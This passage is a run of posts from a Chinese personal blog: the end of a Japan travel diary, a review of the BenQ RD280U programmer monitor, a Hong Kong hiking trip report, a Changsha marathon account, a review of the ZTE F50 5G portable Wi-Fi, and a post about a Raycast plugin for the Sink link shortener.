OK。吃完饭出来，接下来步行前往江之岛。马路对面的一家餐厅和排队的人，店门面的配色看起来很舒服。江之岛一个靠近镰仓的一个近岸离岛，也是一个著名的旅游景点，有不少游客。从堤坝去往江之岛的路上，见到另一头钓鱼的人，下午了，远处也起云雾，富士山开始变得模糊，回想今早能看到那么清晰的富士山，还是觉幸运。来到江之岛上，密密麻麻的人潮攒动。岛上有山，可以步梯登山，岛上有寺庙。来到山顶，有一片小花园，看到一颗掉了叶子的树。江之岛不大，绕一圈，见到海边的礁石，上面还有人在那摄影。山腰上的饭店。在江之岛逛了一圈，又步行回来镰仓海边，和老婆坐电车一趟往返，刚好休息。从车站下车，又来到海边，海边的一座桥。风很大，海浪波涛汹涌。和老婆在海边的堤岸上又坐了一阵，温度不错，风吹起来也并不冷。海边的售卖机，阳光从缝隙中穿过。即将落日，海边也被暖色的夕阳笼罩。今天的镰仓之行，十分轻松，好久没有这么惬意了。DAY4 东大晨跑・明治神宫​第四天，开始我在东京的第二次晨跑，今天的路线是东京大学和上野公园。依旧早起，向北跑向东京大学。上一次来东京时，曾经和老婆在夜晚来过东京大学，但是由于晚上关门，并没有进去参观，这次晨跑也算是补上上次的遗憾。这个红色的大门就是「赤门」，建于 1827 年。来到上次止步的东京大学正门，这次开放了，无人看守，我也就直接跑了进去。进门的林荫道，郁郁葱葱。林荫道尽头，是东京大学安田讲堂，也是东大的地标之一。东京大学是日本的最高学府，成立于 1877 年，地位等同于中国的清华北大。东大现在全球大学 QS 排名 30多，已经落后北大和清华。跑步穿过东大，没多远就又到了上野公园，早晨的上野公园，空空荡荡。上野恩赐南部公园中的「不忍池」。继续往北跑，来到博物馆门口的广场。见到不少晨练的人。从上野公园出来，又往秋叶原跑了一转，算是结束了这次晨跑。今天的行程是明治神宫，其实我对这个地方也没啥兴趣，但是这次旅行，本身也就是没啥目的的放松之行，所以倒也没什么所谓。今天的游客很多。明治神宫位于涩谷区，建于1915年至1920年，二战时被焚，1958年按原样重建，靠近新宿和原宿，绿树成荫。这里的明治，也是我们熟知的「明治维新」那个「明治天皇」。中日近代都经历过类似的社会变革，可惜两国后面一个世纪的命运，走向却是截然不同的。看到一个通行禁止的牌子。来到一处牌匾处，我对日本近代文化不是特别感兴趣，所以也仅仅是抱着参观的态度。来到明治神宫正殿，左右两侧各有一颗圆形的神木，被称作「夫妇楠」，象征着明治天皇和昭宪皇后的深厚感情。刚好碰到在明治神宫举办日本传统婚礼的新人，普通人也可以申请，看数据说每年有 1300 多人在这里举办婚礼。院内的树木，不愧被称作「都会中的森林」。参观完正殿，我和老婆就步行前往下一个目的地代代木公园，中途路过一个挂满灯笼的墙，看了下好像都是酒的品牌。走到神宫北面的一处草地。如果居住在周围，在这里散步的确是一种享受。从明治神宫步行，绕了半个多小时，来到南面紧邻的「代代木公园」，这里也是东京市民热门的公园之一。其中的狗狗公园也算一个特色。公园中写生的老人。虽然已经过了花季，公园中的花朵依旧茂盛。恰好碰到举办「泰国节」 Thai Festival，有很多东南亚国家的美食，也看到很多东南亚裔的人，这些年日本逐步放开移民，吸引了不少东南亚外劳。由于泰国节人太多了，我和老婆并没有停留太久，步行前往涩谷。在代代木公园另一个大门口的广场，见到不少跳舞的人。干净的街道，这也是我喜欢东京的原因之一。涩谷号称现代日本的文化中心，年轻人的聚集地。果然人多。在一条巷子里，见到了蜜雪冰城，看到时笑了，前几天王思聪逛街，也在这里被人拍到。从涩谷逛完，我和老婆去秋叶原吃鳗鱼饭，正在吃饭的时候，突然收到郭宇发来的信息，问我还在不在东京。本来这次东京行有约他，但是之前安排的行程，我来东京的时间，他刚好在意大利了，所以没能见上一面。没想到后来我的机票改签，延后了几天，他也刚好在今天回到东京，所以就约了晚上聚一聚。郭宇是我的学长，也是改变了我人生轨迹的一个人，有关他，和我和他的经历，之前曾经写过一篇文章：如何看待年仅 28 岁的郭宇宣布从字节跳动退休？去年在深圳有聚过一次，我和老婆与她的相聚，则是 6 年前的大阪。如今在他东京的豪宅再相聚，天南地北聊了不少。就是这次太赶了，没能蹭上他一顿饭。也不早了，想着他刚回国，也不打扰他休息，郭宇很热情开车送我们回了酒店，也是第一次体验首都高逮虾户。DAY5:东京铁塔​在东京的最后一天，晚上的航班回国，今天的安排也很轻松，就是去东京铁塔打个卡。在酒店收拾完行李寄存，坐地铁来到东京铁塔。可惜今天天公不作美，下起了雨，但是想一想前几天都是好天气，最后一天下下雨，也算是给我们体验一下不一样的东京。七年前来到东京，在晚上看到一次东京铁塔，这次雨天再来看看。给老婆拍个打卡照。东京铁塔建于 1958 年，高332.9米，比巴黎艾菲尔铁塔还高 8 米，是日本第二高的结构物，仅次于东京晴空塔。是日本的象征之一，也是东京的地标之一。距离东京铁塔，有一个「麻布台之丘」的新建观景台，2023年11月开幕，顶楼有一处室内观景台和咖啡厅，能直接看到东京铁塔，目测会是以后又一网红打卡地。也在这里，给老婆拍了一张照片，也算是这次东京之行的结束。归程​雨中拖着行李，坐 JR 到了成田机场，时间尚早，在机场星巴克买了杯咖啡，等待登机。花了两天时间，终于还是写完了这篇游记。上一次去日本，还是青年，这次再来，已是中年。过去这几年，世界，家庭，包括自己，都发生了诸多变化。成家了，创过业，又回去工作几年，可谓也是踉踉跄跄。时光匆匆，有时候还挺幸运自己过去一直「记录」和「分享」的习惯，回看过去旅行的点点滴滴，时不时也能找回一些过往的幸福和温馨。补上这篇游记，也是对未来自己的一种交代，希望再过 5 年，再过 10 年，再过 20 年，再回看这些文字和照片，依旧能感受到生命中的点滴美好。
Source: 罗磊的独立博客

**2024 桌面升级: BenQ RD280U - 为程序员打造的显示器**
对于程序员这个群体来说，使用最多的设备，除了键盘，就是显示器了；前者是用来输出和创作，后者则是每天长时间的观看和阅读。不管是在 V2EX 还是 B 站，在程序员这个群体的外设话题中，问得最多的话题就是「用什么键盘」或者「用什么显示器」。我是一个程序员，回想我拥有的数码和外设产品，除了一把 2017 年老婆送的 HHKB 键盘，基本没有什么产品号称「为程序员打造」的外设。对于键盘，经过这几年国内外各种品牌和配件厂商极其夸张的内卷和竞争，从成品到客制化键盘，不管是阵列、轴体还是键帽，每个程序员都可以找到合适自己的键盘。我自己目前主力使用的键盘分别是一把经过 YDKB 无线套件改装的HHKB Pro 2，另外一把是同样 HHKB 配列 60键的客制化键盘Qwerty 60。这两把键盘，陪我走过了职场的大多时光，写下了无数代码，也敲下了许多文字。对于显示器，我现在家中有三台显示器，构成了我的办公桌和工作台。上面这张图，也是过去这几年我的办公桌的变迁。两台 LG，一台 Dell，都是 27英寸 4K 显示器。对于互联网行业用户来说，如果你的职位是设计师，还有专门的「设计显示器」，强调色域和色准，之前在公司曾经负责过给设计师采购显示器，也稍微了解了一下这个领域。但是对于程序员来说，可做的选择基本只是在1920x1080、2560x1440、3840x2160这三个分辨率中，选择一款合适价格的型号罢了。直到上个月，我第一次知道这台号称「专门为程序员打造的显示器」，截至今天，也已经使用了将近一个月的时间。开箱​这还是我第一次使用 BenQ 的显示器，纸盒收纳，外观上印着Ultimate Coding Productivity「终极编码效率」的字样。正面的设计，一台笔记本，一个横向正屏，一个竖向副屏，恰好也是我现在自己桌面的组合。从纸盒下方卡扣打开包装，显示器的支架和底座放在外层。纸盒内部也印有如何打开包装和指引。见到显示器的第一眼，这是一台28英寸的显示器，加上走的专业路线，非轻薄向，看着分量不轻。随机附送了一根电源线，一根 HDMI 线，一根 DP 线，一根 USB Type-C线，还有一根 USB-B 线。底座十分宽大，常见的银灰色的配色，支架支持上下移动和旋转。支架背后有一个皮质的线材收纳扣，可以将电源和数据线材穿过去。外观​在放到办公桌之前，先来张背影照片。背后采用纹理凹凸设计，看着比较有质感，但是有预期的是，后续需要注意灰尘和清洁。BenQ RD280U 背后有一个亮点，圆环其实是一圈可调节的背光灯，被称作Moonhalo。明基英文站介绍: Moonhalo Effect背面的接口，有一个 DP 接口，一个 HDMI 接口，两个全功能 Type-C，一个 USB-B。其中 Type-C 支持 90W 充电，大多情况下满足我的 MBP 的充电需求，我的 MBP 是 M2 Max，但是从来没触发过极限功率，之前 LG 和 Dell 的显示器也都是 90W 充电。显示器背后的防盗锁孔，又称肯辛顿 Kensington 锁孔，在办公向的笔记本电脑中也常见（这个我也是查 ChatGPT 才知道的知识）。看得出 RD280U 也是有着商务办公的定位。尺寸​搬到电视柜上，与我家 75 英寸和 16 英寸的 MacBook Pro 放到一起，比比大小。 BenQ RD280U 的3:2的显示比例还是一眼就能看出差异。搬来我的 Dell U2720QM，我特意把屏幕的实际显示部分从底部对齐，可以看出两者物理上的差距。设备尺寸分辨率显示比例BenQ RD280U28.2 英寸3840 × 25603:2Dell U2720QM27 英寸3840 x 216016:9通过计算可得出，理论上 RD280U3840 × 2560 = 9,830,400比传统的 27英寸 4K 显示器3840 x 2160 =8,294,400会多显示18.5%的内容BenQ RD280U 表明采用了雾面屏。在客厅拍摄这张时候，正是正午，阳台的阳光很强，拍这张照片的时候，发现两个显示器对于反光的处理十分明显。如果你的办公室的工位敲好靠近窗户，一定能感受到这种抗反光的好处。会想到之前在公司上班的时候，由于我的工位靠近窗户，每天早上到工位的第一件事情就是拉下窗帘，要不白天压根看不清屏幕。使用和编程体验​接下来把 RD280U 搬到办公桌，又费了不少功夫，为了整理桌面的线材，还专门买了几个小配件改装办公桌。luolei@luoleiorg花费巨资，买了几个小物件，把老婆电脑桌台面上的线，尽量都收纳到了桌下。🤓下午4:09 · 2024年9月8日44524下面再分享一下使用过程中的一些记录。BenQ RD280U 支持 VESA 支架，但是我暂时还是先使用自带的支架。支架除了支持上下110mm的纵向调节，也支持前后正5度到负20度的调节，我的桌子不是电动升降桌，对于我来说垂直就可以了。还是第一次用上3840x2560这个分辨率， macOS 上我缩放到2560x1707，与我之前使用 27 英寸显示器对应2560x1440的分辨率统一。如果使用 Type-C 或者 DP 线连接，可以达到 4K 60帧的刷新率，但是如果使用 HDMI 线，则只有 4K 50帧，询问客服说是 HDMI 标准的限制。使用 Type-C 连接 Macbook Pro，提示是通过 USB3.2 连接，我的 MBP 有三个雷电，分别接上两个显示器刚好。作为一个编程显示器，除了规格上的特殊，软件上也做了许多的特殊适配，打开 OSD 调节面板，我第一次见到这么多选项的显示器。显示器正面的 Logo 下方，是一块触摸键，支持自定义触摸切换到指定的模式。RD280U 这台显示器对于编程场景时有做场景优化，尤其是对于暗夜模式亮色字体时这种反差较大的场景，会通过增加背景对代码的对比度，增强代码的显示效果，我在白天室内拍了一张照片，正面和侧边的视角都有，可以看出不同的显示器，同样 VSCode 显示的内容，RD280U 的更黑点，字体反差效果也更明显。夜间效果​不同的程序员有自己不同的配色偏好，有些人喜欢亮色主题，有些人喜欢暗夜主题，使用 IDE 终端，人眼在白天和晚上，对于亮色和暗色模式的显示感知差异很大。RD280U 允许切换不同的主题模式。同时 RD280U 有一个 EyeCare 猫头鹰模式，通过固件调整亮度，提供调整到极低的亮度与色彩平衡方案。开启猫头鹰模式，显示器面板上会亮起一盏小小的猫头鹰灯。接下来也是 RD280U 的亮点 MoonHalo，支持 270° 和 360° 的照明，也支持 7 档亮度和色温调节，从暗到亮，从暖到冷。照片就是我的书房，关掉了所有的灯，使用固定的光圈和 ISO 拍摄的照片。 之前我的另外一台显示器使用的是屏幕挂灯的解决方案，相比一下 MoonHalo 这种在背后的补光方案，更加适合程序员这种不需要太多光线的工作环境。深夜时分，如果还想敲代码，开启 Moonhalo，只让自己的工作台有一点点的灯光，就可以通过增加环境光，缓和屏幕直射光对眼睛的刺激，在营造沉浸的工作氛围的同时，缓解眼睛的疲劳。桌面控制​除了支持通过物理或者触摸按键调节显示器。BenQ RD280U 还可以通过 BenQ 的 Display Pilot 2 软件控制显示器。OSD 上所有的功能开关，模式，均可以通过软件控制，也可以通过软件自定义配置文件，一键切换。对于开发者来说就十分方便了，可以直接通过 UI 切换模式、调整屏幕亮度、调节灯光等等。更多​最后为了更直观展示 RD280U 的特殊，我又把办公桌重新布置了一下，与 Dell 组了个双屏。一个28寸、一个27寸的屏幕并排放到桌面上，一下子觉得眼睛看不下来。一般而言会组成有弧度的排列，这里我并排展示，是为了更好展示两者的差异，非最佳的工作角度。两台显示器采用左右布局，分辨率分别缩放到2560x1707和2560x1440的分辨率，这样让两台显示器在视觉上保持一致。两个屏幕同时打卡哔哩哔哩首页，可以看到 RD280U 展现的内容多了整整一行。两个屏幕同时左右分屏，打开 V2EX 和 Chiphell，也可以看到 RD280U 展现的内容更多，3:2在这种日常资讯浏览的情况下，确实有优势。再来到一个程序员常见的开发常见，一遍开着浏览器预览开发页面，另外一边开着 VSCode，也可以看到 RD280U 展现的内容更多。但是屏幕大是有大的好处，也会有一个尴尬，如果你用 RD280U 想看看视频，尤其实在白天全屏看视频，你就会发现上下的黑边就特别明显了。还有一点就是 Xbox 和 AppleTV 均无法使用正确比例的分辨率，如果你外接 Xbox 或者 ATV，会尴尬发现显示的内容都变形了，看来对于这种特殊比例的显示器，还是要看看设备的支持情况。总结​这款显示器是一款定位十分明确的产品，专门为程序员打造，而程序员的需求相对就简单多了:看得多而清楚，看得久而不累。市面上之前并没有这么专属职业属性消费级显示器产品，相比传统的 LG 和 Dell 同级别显示器，也并没有贵多少。最近半年，我开始居家办公，每天绝大多数时间都是在自己的书房 Coding，不出意外的话，我会继续使用 BenQ RD280U，作为我的主力显示器。显示器太多，眼睛有点不够用了。现在倒考虑重新部署下办公桌，考虑 DIY 一张超长的光轴木桌，再重新布置下工作台。大家如果对于这块有什么建议，也可以给点建议聊聊。
Source: 罗磊的独立博客

**香港徒步:麦理浩径第二段**
香港的徒步路线非常知名。只需搜索「香港、户外、徒步」，就可以找到许多路线。虽然我家在深圳，并且也去过香港很多次，但之前并没有专门去香港徒步过。过去曾和朋友计划徒步几次，但要么是天气太热，要么是工作太忙，由于各种原因都没有实现。这个国庆假期，我和弟弟轻装上阵，走了一趟麦理浩径第二段。行程​时间用时(h)地点花费备注9:500深圳湾口岸$60/人过海关，永东巴士到钻石山10:501钻石山$65/人4人拼车，打的到万宜水库东坝，共$26012:002万宜水库东坝0到达徒步起点麦理浩径二段起点13:153.5浪茄湾014:304.5西湾山顶016:06西湾016:306.5咸田湾$160/人坐船回西贡码头17:308.5西贡码头19:008.5钻石山$60/人永东巴士回深圳湾口岸20:0010深圳湾口岸从深圳出发去麦理浩径徒步，无论你选择哪个口岸过关，都有详尽的线路经验可供参考。你可以直接在小红书上搜索相关信息，我就不再赘述了。在这里推荐下香港当地的徒步路上，从照片到地图，极其详细:【一起行山闖蕩去】 麥理浩徑第2段我唯一的建议是：如果条件允许，请优先选择打车。拼车所需的交通成本并不高昂，并且能大幅节省时间。徒步​麦理浩径二段的起点在万宜水库东坝。今天的天气不错，气温 28 度，适合徒步。的士可以直达这里，省时省力。这片就是万宜水库，是香港储水量最大的水库。我还是第一次见到靠着海边的水库，也算是一大特色吧。东坝有歇息的凉亭，也有洗手间。不少人在这里修整。著名的破边洲，印在港币 500 元纸币上的景点，也是著名的网红打卡点，不少人会专门来这里拍照。沿着堤坝走过去，但是爬上去需要一定的功夫。绕过头几座山头，看到第一个沙滩浪茄湾。麦理浩径的指引牌，我们今天的起点也是一二段交界的位置。从东坝出发约一个多小时，到达浪茄湾，这里有片小沙滩，岸边也有绿荫，不少人在这里歇息。这个枯木，也是一个网红打卡点，不少人在这里摆拍。在浪茄湾没有停留多久，我们就继续出发了，正午十分，买了一瓶可乐，花了 $30 港币。麦理浩径一路标记齐全，不用担心迷路。我们是正午出发，温度虽然不高，但是一路爬坡，我和我弟只穿了普通的休闲衣物，没有带登山杖，还是挺费功夫。今天这次徒步我也没有计划走完，就穿了普通的装备。背了一个小鹰的登山包，带了4瓶水。帽子、面罩、袖套也是必备，可惜忘了拿墨镜。从西湾山顶看到的三湾。今天徒步的人不少，大多都是内地过来的游客。下午4点，已经徒步约四个小时，到达西湾，这里也是麦理浩径二段的中间点。有个小村庄，也有商店，不少人会在这里坐船或者坐车结束行程。我和我弟看时间尚早，准备继续走一段到后面的咸田湾。下面就是我们今天的目的地。海边的礁石。过了西湾之后，徒步的人就少了很多了。不同于登西湾山颇费体力，这段路就比较平坦，轻微起伏。远处的大洲和尖洲，香港本地称作史努比岛。。到达咸田湾，这里也有一些民居，今天也很累了，就在这里乘船回西贡码头，结束了今天的徒步行程。由于没有码头，需要涉水登船，船票 $160 港币/人。快艇速度很快，今天风浪不大，沿着海岸线一路向西，也能看到不少沿岸风光。恰逢傍晚，一天登山劳累，吹着海风，看着夕阳，也算是不错的体验。轨迹​从早上9点30从家出发，到晚上8点半回家，实际徒步约 4 个半小时，坐船 1 个小时。麦理浩径的确是不错的徒步线路，准备下个月同老婆再来走一趟。
Source: 罗磊的独立博客

**长沙马拉松:回到 5 小时内**
我从 2013 年开始跑步训练，在 2014 年跑了第一个马拉松。2014 年到 2018 年那几年，我每年都跑马拉松，累计已经跑了 7 场全程马拉松。2019 到 2022 这三年，由于疫情和工作的原因，中断了三年，去年我开始恢复自己的「人生马拉松」计划，跑了第 8 场全马。珠海马拉松:时隔五年,我又跑了一个马拉松。今年的第 9 场，我选择了长沙马拉松。虽然我是一个湖南人，但是我却没有去过长沙。我的表弟定居长沙，8 月乔迁新居，刚好趁着这次机会在他家住了几天，也顺便在长沙玩了五天。行程​现在回湖南高铁很方便，不管是从东莞还是深圳，坐高铁只需要 3 个小时左右到达长沙南站。在高铁上还遇到后座两位大叔也来跑马拉松，下车的时候还聊了一下，约伴一起去领取参赛包。检录​马拉松在周日举行，我周五提前到，从长沙南站坐地铁一站到国际会展中心。由于是周五，很多参赛者还没来（大多会在周六报道），人不太多，我领取物资的过程十分顺利，但是周六那天，听说由于人太多，很多人排队两三个小时，被很多跑友吐槽组织得不行。领取物资的地方。这次领取到的参赛包。我的号码牌，这次我长沙马拉松报名错过了报名时间，是通过赞助商渠道弄到的名额，分配我到了 F 区，属于比较后的区。今年是长沙马拉松第 10 年，参赛包里的物资展开（也有一些我在博览会打卡领取的物资），感觉一般般，广告和廉价的食物比较多。赛前闲逛​我表弟的房子在梅溪湖，属于长沙的新区，新楼盘很多，环境不错，晚上吃完饭去梅溪湖边逛了逛，湖边的夜景很美，有不少散步的人。比起一线城市的房价，长沙的房价相对要健康很多。周六闲着没事，直奔国金中心，一出地铁，人潮涌动，真热闹。长沙市中心五一广场逛了逛，人真多，街边很多餐饮店，长沙不愧是网红城市。长沙最高楼国金中心，楼下有 Apple Store，楼上也是一个网红打卡地。坡子街这个派出所也是一个网红打卡点，很多人慕名而来，之前是不允许拍照，后来警察可能觉得拦也拦不住，把牌子改成了「请文明拍照打卡」，但是依旧顶不住游客顶风作案。挺好玩的一个地方。街头执勤的交警在给一个大妈指路。我去年减肥之后，已经戒糖很久了。但是都来长沙了，一杯茶颜悦色还是必须的，完成打卡任务。在五一广场逛了逛，走到了江边，又来到了文和友，也算是长沙的一个餐饮网红，前几年也开到了广州和深圳，最近看新闻听说要倒闭了。逛得差不多了，穿过坡子街，走回五一广场地铁站，坐车回家休息。晚上冲完凉，把第二天的装备收纳了一番，放到床头。这次装备跟上次差不多，除了凡士林忘带了，其他东西都齐全。比赛日​早上 5 点半就起床了，吃了两个面包，换好衣服，坐地铁前往起跑点，今天马拉松参赛者乘坐长沙地铁免费，地铁为了方便跑友，还提前到 5:30 发车。到达五一广场换乘去贺龙体育中心，密密麻麻基本都是跑马的人。马拉松 7点30 起跑，我到达才 6点45，还有半个多小时。此时人已经很多了。由于我在 F 区，发枪时间是 8:00，在这里等的时候让跑友给我拍了张照片，腰上鼓鼓的里面装满了补给用的能量胶。前面 A 区已经发枪了，我们 EF 两区也慢慢开始往前挪动。7点 55，慢慢到了起跑线，大家在等等起跑。发枪咯，从我的位置到通过计时毯，只用了 1 分钟，这也是分区发枪（间隔15、30分钟）的好处。今天长沙的天气属于多云，虽然不是阳光明媚，但这种温度还挺适合跑步的。起跑没多久，上桥进入橘子洲。到达 5Km，第一个补给点。橘子洲里的道路比较窄。到达毛泽东头像，来都来了，自拍打个卡，不少跑友还专门停下来留影。跑了没多久，我追上了第三枪 445 的兔子。他们比我们先 15 分钟发枪，我跑马前半程的速度还是比较稳，基本都能保持 10公里/h 的速度。跑了两个多小时，终于到达半程，对于半马的人来说他们今天的比赛已经结束了，而我们全马的比赛才刚刚开始。去年跑完珠海马拉松之后，2024 整个一年，我都没有跑过超过 10km，一般就在健身房跑 5km，过了 25 公里之后，我就能感觉到自己的体能下降了，后面开始慢慢走走跑跑结合。到达 30 公里，除了跑不动，身体倒没有其他什么不适，用时 3 小时 17分钟，这 10 公里比前面慢了 15 分钟，虽然我平时跑步少，但是一直坚持健身，今年的身体素质还是明显强了很多。终于到达40公里，30 公里到 40 公里这一段，我一直在看自己的配速，计算如果我这次要跑进 5 小时，需要保持多少的速度。一开始 30 到 35 公里还比较紧张，越到后面，发现自己好像能稳定，倒轻松不少。最后 400 米，终点就在前面，长沙马拉松最后两公里是一个长上坡，很折磨人。终点就在前面，最后这几百米，加快了速度又跑了起来。成功达到终点，十分开心，完成了今年的「人生马拉松」。看了下自己的手表计时 4 小时 56 分，也达成了我的目标（进入 5 小时以内）。领完奖牌和纪念品，开心再记录几张。过了一会，比赛确认的成绩发送到了我的手机。跟我手表记录的时间差不多。长沙马拉松的关门时间是 6 小时 15 分钟，离开之前，还能看到不少跑友在继续努力。赛后闲逛:湖南博物院​跑完之后就回家了，吃完饭后，洗完澡就睡了一觉，醒来后腿十分酸痛，起立转身都感觉困难。第二天周一，腿脚好了点，但是也懒得出去，睡到中午起床，在家休息了一天。周二，跟我堂弟去湖南博物院看了看。湖南博物院是一个很多人推荐的地方，预约参观，人很多。博物馆展示湖南地区历年来的不少文物。一个萌萌的鼎。看到 Yale 的文凭，这个也是现在「雅礼中学」的前身。湖南博物院最具特色的「长沙马王堆汉墓」相关展览。马王堆辛追夫人生前用过的木杖（难以想象这是 2000 多年前的文物）。逛完博物馆，感觉湖南博物馆可以放到我去过的博物馆的前几名，马王堆汉墓这些十分令人惊叹，值得一逛。逛完博物馆，时间尚早，又去五一广场附近逛了逛，这个黄金楼也是一个网红点。吃了黑色经典臭豆腐，味道不错。看到一个辣条博物馆，给老婆拍了张照，感觉下次可以带老婆再来玩一玩。还看到一个俄罗斯国家馆。成绩​这次一个人去长沙跑马，还是挺爽的，湖南菜好吃，长沙也好玩。最后再看看成绩，这次全马的成绩终于回到了 5 小时以内，感觉加大跑量的话，明年回到 4 小时 30 分钟还是挺有希望的。
Source: 罗磊的独立博客

**最小巧的 5G 随身 Wi-Fi: 中兴 F50**
前段时间，买了个目前市面上最小巧的一线品牌 5G CPE 随身 Wi-Fi:中兴 F50。中兴 F50 5G 随身 WiFi5GWi-Fi入手价格:¥337原价:¥369目前售价 ¥369，我京东券后实际支付 ¥337，用下来感觉还是挺满意的，在这里分享给大家。选购思路​我手机卡很多（四个运营商，10 多个号码），平时出门包里三台手机(两 iPhone 一安卓)，之所以想买一个单独的随身 WiFi，一是发挥多多余 SIM 卡的价值，二是想买个玩。这段时间偶尔会出门工作，去图书馆呆一天什么的，个人偏好原因，不喜欢公共 Wi-Fi（很多公共 Wi-Fi 不支持 IPv6:我又有需要通过 IPv6 调试跨境网络的需求），倾向自己开热点，加上对网络速率要求比较高，所以决定弄一个 5G 随身WiFi。不需要内置电源（随身有充电宝)，开车有 USB，去图书馆时也会带个快充头，所以供电无所谓。综合上面个人需求，在各个渠道大概搜索了下关键字，最终下单中兴 F50，插自己的卡使用。开箱​中兴也算是通信领域的老牌厂家了，这也是我之所以选择他的原因。F50 的包装很小。盒内物件，除了简单的说明书，还附送了个卡针和短 Type-C 数据线。设备的颜值不错，左上角的 5G 红标有设计感。右上角有两个指示灯灯，分别表示基站网络和 Wi-Fi 状态与身份证大小对比，的确很小巧。SIM 卡槽和卡托，还能放一个 TF 卡，对于我来说读卡器是个鸡肋功能，相机用的都是 SD 卡，没有什么其他设备用到 TF 卡。管理后台​连接上 Wi-Fi 或者网络之后，就可以通过浏览器访问管理后台。后台可以查看当前的网络状态，也能查看短信。5G/4G 网络配置，Wi-Fi 配置，跟常见的家用路由器没有太多差别。高级配置里可以配置更多的信息，报错指定频段、USB 协议等等。对于一个随身路由器来说，这些配置也足够了。使用体验​由于不同的运营商在不同的地区的信号不一样，所以我只说下自己的体验。使用这个随身路由器也有几个星期了。我在家、在车上、在图书馆都使用过。整体还是挺满意的，使用广电卡，Wi-Fi 连接模式下，跑到了 400+Mbps 的下行速率，对于日常场景完全够用了。优点​体积小巧，50g 不到重量，随身携带很方便支持 2.4G/5G Wi-Fi，但不能同时开启。频段覆盖还行，四大运营商 5G 都能用。Type-C 接口支持充电和数据传输，支持 TF 卡扩展，新固件可以直连 MacBook(有线上网)。速度不错，我用广电惠民卡(移动共享频段)，iPhone 通过 Wi-Fi 连接，5G 下行跑到 400+Mbps。缺点​发热问题有点玄，听说长时间负载会降速，我才开一会，就能感觉设备的外壳温度上来了，但是我没有高负载的场景，不会持续满速率下载，在图书馆用一天感觉还好。这台机器有很多 DIY 散热解决方案，某个角度也反应了大家对这台设备「瑕不掩瑜」的认可吧。没有电池: 中兴也有一个内置电池的版本，但是我觉得这个不算缺点，直接插一个电源或者充电宝就行了。尤其是有几天，我直接把他放到车的扶手箱，车启动的时候就自动开机了，很方便，没有电池，也不用担心电池自燃的隐患。参考资料​这篇文章只是个人的体验分享，对于更详细的性能、参数等，建议可以看看张大妈的分享文章，由于 F50 是一款很热门的机器，在 B 站和小红书也有很多分享:什么值得买: 499元！中兴F50 5G随身WiFi详细测评、体验，来全面了解下这款5G超薄卡片WiFi怎么样哔哩哔哩:中兴 F50总结​总结一下这个设备的适合人群:有多余手机卡或者大流量卡，想发挥流量价值。对随身设备便携性要求高，但是又希望能够有 5G 网络且性能满足日常使用。
Source: 罗磊的独立博客

**我开发了一个短链管理插件: Raycast Sink**
最近花了一点时间，开发了一个 Raycast 插件，当时还发了一条推，今天这个插件通过官方审核，已经上架 Raycast 的官方插件商店。写篇文章分享一下。luolei@luoleiorg转码萌新，用 Cursor 花了2小时 , 给效率神器 Raycast 开发了个短链插件。🐶
基于目前市面上最佳，由@ccbikai
打造的使用 Cloudflare 技术栈的开源短链系统 Sink 。直接通过 Raycast 便捷管理和使用 Sink 短链。
🔗 仓库地址: https://github.com/foru17/raycast-sink
🛍️ 商店地址: https://zuoluo.tv/sink
0️⃣ 开源 ✅
1️⃣ 一键配置 🔧
2️⃣ 离线优化 🚀
3️⃣ 快捷操作(查询/创建/编辑/跳转/剪贴板) 🎯

目前我用这个当网站书签，把一些常用的网站落地页记录，懒得打开浏览器时可以直接快捷跳转 🤓下午4:09 · 2024年9月8日179背景​过去好些年，我都使用老牌的YOURLS作为自己的短链服务。最初在自己的云服务器上部署，后来迁移到了家中的Homelab。尽管其运行无问题，但需要在实体服务器上运行并进行维护仍然有些麻烦。此外，也曾因家庭网络故障几次导致短链服务中断。对内容创造者来说，短链非常有用。它不仅方便分享和修改链接，还可以帮助统计访问量并了解用户的点击行为。上个月，花了一天时间，将自己的短链服务从 YOURLS 迁移到了朋友面条@ccbikai开发的开源短链服务Sink面条@ccbikai【开源】 Sink - 基于 Cloudflare 带访问统计的短链系统

特性：
1. 🪄 AI 生成 Slug
4. Cloudflare 部署, 支持 3,000,000 次访问/月上午8:24 · 2024年5月25日21287基于 Cloudflare 的短链服务，符合我们前端技术栈的使用习惯。具体的部署和使用，可以直接看官方文档，对于有技术背景的人来说，还是比较容养上手的。Raycast 插件​Raycast是 macOS 上著名的快捷启动工具，我在今年已经从Alfred 5切换到了 Raycast。Raycast 有一个很好的插件生态，我也顺便开发了一个 Sink 的短链管理插件。现在这个插件在官方插件商店，可以直接搜索Sink安装使用。Raycast Store: Sink Short Links Manager我已在我的 GitHub 上开源这个插件，有兴趣的朋友可以参考。Raycast Sink主要功能​插件基于 Sink 的 API 进行的封装，交互相比网页端更加简单和易用，主要功能包括：快捷查看，创建，搜索和编辑短链接缓存优化：本地缓存短链接列表，减少网络请求剪贴板集成：立即将短链接复制到剪贴板i18n：支持中文和英文演示​一键查看所有短链接列表，支持favicon预览。控制台快捷管理短链接，支持复制，打开，编辑和删除。支持查看短链的详情、统计信息。本地和在线搜索短链接，按照字段权重排序。快捷创建短链接。关于用 AI 开发这个事​用 Cursor 花了 2 小时开发一个应用这句话当然是在玩梗。真实情况是：这个插件的最小 MVP 的确就花了差不多一个小时搞定，但后面补充文档、完成上架流程、研究官方指引反而花了不少时间。后续打磨和优化代码又花了一整天的样子。当时跟面条还聊了下，现在用 AI 做前端这种小应用真的是太方便了。尤其是对于我们这种有经验的开发者，只需要需求描述明确，结合自己的代码经验，很容易把一个像模像样的小应用搞定。前几个月，我自己还独立开发了一个大型商业应用，前后端全栈，AI 也帮了很大的忙，由于是商用就不方便公开了，大型应用中的 AI 开发相关的经验，有机会再跟大家分享。个人的经验和建议就是：不管你是不是计算机相关专业出身，即使现在 AI 已经很强大，还是建议系统学习下编程，至少掌握一门编程语言（比如 Python 或者 JavaScript）。配合 AI ，可以解决日常工作中的许多问题。
Source: 罗磊的独立博客

**Raycast Hoarder: 开源 AI 书签管理插件**
